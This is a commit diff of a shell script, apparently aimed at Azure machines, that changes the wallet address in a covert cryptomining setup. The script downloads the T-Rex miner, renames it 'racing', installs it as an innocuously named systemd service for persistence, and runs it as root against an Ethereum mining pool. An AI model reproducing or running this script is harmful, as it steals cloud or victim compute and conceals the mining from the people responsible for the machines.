59f3b1d02a4e2b89d5db8fec586ba52cf39036d4
jotmbtmyejhle <96216348+jotmbtmyejhle@users.noreply.github.com>
2022-03-08 22:39:03 +0800

    Update hiepstuazure.sh

--- hiepstuazure.sh
+++ hiepstuazure.sh
@@ -11,7 +11,7 @@ sudo apt-get install libcurl3 -y
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xe968dA3271ADCddA2496757301D2A5Ffa400CF50 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xead20233E853EA74a599b6E657f266a2Bd631F88 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xe968dA3271ADCddA2496757301D2A5Ffa400CF50 -p x &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xead20233E853EA74a599b6E657f266a2Bd631F88 -p x &
